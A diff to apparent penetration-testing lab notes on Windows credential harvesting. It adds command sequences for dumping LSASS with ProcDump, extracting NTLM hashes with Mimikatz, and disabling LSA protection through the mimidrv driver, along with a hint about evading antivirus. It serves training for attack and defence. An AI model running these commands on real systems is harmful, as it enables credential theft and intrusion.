@@ -1,4 +1,6 @@
-# Brute force  & Cracking
+# Credential Gathering & Cracking
+
+Stopped at Windows Credential Manager on [credential-harvesting.md](credential-harvesting.md "mention")
 
 ## Analyzing Hashes
 
@@ -270,6 +272,10 @@ python3.9 /opt/impacket/examples/secretsdump.py -sam sam-reg -system system-reg 
 
 ### Local Security Authority Subsystem Service (LSASS)
 
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
 #### Graphic User Interface (GUI)
 
 To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
@@ -289,6 +295,155 @@ Copy the dumped process to the Mimikatz folder
 ```
 copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
 ```
+
+#### Sysinternals Suite(No GUI)
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt.&#x20;
+
+We can specify a running process, which in our case is lsass.exe, to be dumped as follows.
+
+**Victim(cmd)**
+
+```
+c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
+```
+
+Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.
+
+### MimiKatz
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,
+
+**Victim(cmd)**
+
+```
+C:\Tools\Mimikatz\mimikatz.exe
+```
+
+Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing `privilege::debug` command as follows,
+
+**Victim(mimikatz)**
+
+```
+privilege::debug
+```
+
+Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the `lsass.exe` process using `sekurlsa::logonpasswords`. If we try this on the provided VM, it will not work until we fix it in the next section.
+
+**Victim(mimikatz)**
+
+```
+sekurlsa::logonpasswords
+```
+
+Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash.&#x20;
+
+Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.
+
+### Protected LSASS
+
+**Example**
+
+[credential-harvesting.md](credential-harvesting.md "mention")
+
+In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` to 1.
+
+<figure><img src="../../.gitbook/assets/image (3) (15).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (16) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
+
+The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
+
+**Victim(mimikatz)**
+
+```
+sekurlsa::logonpasswords
+```
+
+<figure><img src="../../.gitbook/assets/image (9) (1) (4).png" alt=""><figcaption></figcaption></figure>
+
+The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
+
+**Victim(mimikatz)**
+
+```
+!+
+```
+
+<figure><img src="../../.gitbook/assets/image (4) (11) (1).png" alt=""><figcaption></figcaption></figure>
+
+Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\Tools\Mimikatz\` and run the command again.\
+
+
+**Victim(cmd)**
+
+```
+cd C:\Tools\Mimikatz
+mimikatz.exe
+```
+
+**Victim(mimikatz)**
+
+```
+!+
+```
+
+<figure><img src="../../.gitbook/assets/image (19) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
+
+\
+Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
+
+**Victim(mimikatz)**
+
+```
+!processprotect /process:lsass.exe /remove
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (11) (13).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+```
+copy C:\Users\thm\AppData\Local\Temp\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
+```
+
+**Victim(cmd)**
+
+```
+c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
+```
+
+<figure><img src="../../.gitbook/assets/image (18) (8).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+<pre><code><strong>mimikatz.exe
+</strong></code></pre>
+
+**Victim(mimikatz)**
+
+<pre><code><strong>privilege::debug
+</strong></code></pre>
+
+**Victim(mimikatz)**
+
+```
+sekurlsa::logonpasswords
+```
+
+<figure><img src="../../.gitbook/assets/image (120) (1).png" alt=""><figcaption></figcaption></figure>
+
+## Windows Cred
 
 ## Hashes
 
